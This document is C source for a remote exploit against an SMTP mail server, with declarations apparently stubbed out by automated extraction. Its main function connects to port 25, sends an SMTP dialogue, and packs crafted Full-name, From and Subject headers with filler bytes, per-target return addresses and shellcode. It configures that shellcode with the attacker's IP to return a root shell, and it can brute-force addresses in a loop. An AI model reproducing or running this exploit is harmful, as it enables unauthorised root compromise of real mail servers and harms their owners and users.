
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


struct TYPE_3__ {unsigned long s_addr; } ;
struct sockaddr_in {char sin_zero; TYPE_1__ sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {int h_length; int h_addr; } ;
typedef int server ;
typedef int buf ;
struct TYPE_4__ {unsigned long angle; unsigned long nops; scalar_t__ aptr; } ;


 int AF_INET ;
 int BUFSIZE ;
 int LISTENPORT ;
 int SOCK_STREAM ;
 TYPE_2__* archs ;
 int atol (char*) ;
 int close (int) ;
 int * code ;
 scalar_t__ connect (int,struct sockaddr*,int) ;
 int exit (int ) ;
 int fflush (int ) ;
 int fixshellcode (char*,int ) ;
 int fork () ;
 struct hostent* gethostbyname (char*) ;
 int getrootprompt () ;
 int header () ;
 int htons (int) ;
 unsigned long inet_addr (char*) ;
 int maxarch ;
 int memcpy (char*,int ,int ) ;
 int memset (char*,int ,int) ;
 int printf (char*,...) ;
 int printtargets () ;
 int readsocket (int,int) ;
 scalar_t__ readutil (int,int) ;
 int socket (int ,int ,int ) ;
 int sprintf (char*,char*,char*) ;
 int sscanf (char*,char*,unsigned long*) ;
 int stdout ;
 unsigned long strlen (int *) ;
 int writesocket (int,char*) ;

int main(int argc, char **argv) {
 struct sockaddr_in server;
 unsigned long ipaddr,i,bf=0;
 int sock,target;
 char tmp[BUFSIZE],buf[BUFSIZE],*p;
 if (argc <= 3) {
  printf("%s <target ip> <myip> <target number> [bruteforce start addr]\n",argv[0]);
  printtargets();
  return 0;
 }
 target=atol(argv[3]);
 if (target < 0 || target >= maxarch) {
  printtargets();
  return 0;
 }
 if (argc > 4) sscanf(argv[4],"%x",&bf);

 header();

 fixshellcode(argv[2],LISTENPORT);
 if (bf && !fork()) {
  getrootprompt();
  return 0;
 }

bfstart:
 if (bf) {
  printf("Trying address 0x%x\n",bf);
  fflush(stdout);
 }
 if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
  printf("Unable to create socket\n");
  exit(0);
 }
 server.sin_family = AF_INET;
 server.sin_port = htons(25);
 if (!bf) {
  printf("Resolving address... ");
  fflush(stdout);
 }
 if ((ipaddr = inet_addr(argv[1])) == -1) {
  struct hostent *hostm;
  if ((hostm=gethostbyname(argv[1])) == ((void*)0)) {
   printf("Unable to resolve address\n");
   exit(0);
  }
  memcpy((char*)&server.sin_addr, hostm->h_addr, hostm->h_length);
 }
 else server.sin_addr.s_addr = ipaddr;
 memset(&(server.sin_zero), 0, 8);
 if (!bf) {
  printf("Address found\n");
  printf("Connecting... ");
  fflush(stdout);
 }
 if (connect(sock,(struct sockaddr *)&server, sizeof(server)) != 0) {
  printf("Unable to connect\n");
  exit(0);
 }
 if (!bf) {
  printf("Connected!\n");
  printf("Sending exploit... ");
  fflush(stdout);
 }
 readsocket(sock,220);
 writesocket(sock,"HELO yahoo.com\r\n");
 readsocket(sock,250);
 writesocket(sock,"MAIL FROM: spiderman@yahoo.com\r\n");
 readsocket(sock,250);
 writesocket(sock,"RCPT TO: MAILER-DAEMON\r\n");
 readsocket(sock,250);
 writesocket(sock,"DATA\r\n");
 readsocket(sock,354);
 memset(buf,0,sizeof(buf));
 p=buf;
 for (i=0;i<archs[target].angle;i++) {
  *p++='<';
  *p++='>';
 }
 *p++='(';
 for (i=0;i<archs[target].nops;i++) *p++=0xf8;
 *p++=')';
 *p++=((char*)&archs[target].aptr)[0];
 *p++=((char*)&archs[target].aptr)[1];
 *p++=((char*)&archs[target].aptr)[2];
 *p++=((char*)&archs[target].aptr)[3];
 *p++=0;
 sprintf(tmp,"Full-name: %s\r\n",buf);
 writesocket(sock,tmp);
 sprintf(tmp,"From: %s\r\n",buf);
 writesocket(sock,tmp);

 p=buf;
 archs[target].aptr+=4;
 *p++=((char*)&archs[target].aptr)[0];
 *p++=((char*)&archs[target].aptr)[1];
 *p++=((char*)&archs[target].aptr)[2];
 *p++=((char*)&archs[target].aptr)[3];

 for (i=0;i<0x14;i++) *p++=0xf8;
 archs[target].aptr+=0x18;
 *p++=((char*)&archs[target].aptr)[0];
 *p++=((char*)&archs[target].aptr)[1];
 *p++=((char*)&archs[target].aptr)[2];
 *p++=((char*)&archs[target].aptr)[3];

 for (i=0;i<0x4c;i++) *p++=0x01;
 archs[target].aptr+=0x4c+4;
 *p++=((char*)&archs[target].aptr)[0];
 *p++=((char*)&archs[target].aptr)[1];
 *p++=((char*)&archs[target].aptr)[2];
 *p++=((char*)&archs[target].aptr)[3];

 for (i=0;i<0x8;i++) *p++=0xf8;
 archs[target].aptr+=0x08+4;
 *p++=((char*)&archs[target].aptr)[0];
 *p++=((char*)&archs[target].aptr)[1];
 *p++=((char*)&archs[target].aptr)[2];
 *p++=((char*)&archs[target].aptr)[3];

 for (i=0;i<0x20;i++) *p++=0xf8;
 for (i=0;i<strlen(code);i++) *p++=code[i];

 *p++=0;
 sprintf(tmp,"Subject: AAAAAAAAAAA%s\r\n",buf);
 writesocket(sock,tmp);
 writesocket(sock,".\r\n");
 if (!bf) {
  printf("Exploit sent!\n");
  printf("Waiting for root prompt...\n");
  if (readutil(sock,451)) printf("Failed!\n");
  else getrootprompt();
 }
 else {
  readutil(sock,451);
  close(sock);
  bf+=4;
  goto bfstart;
 }
}
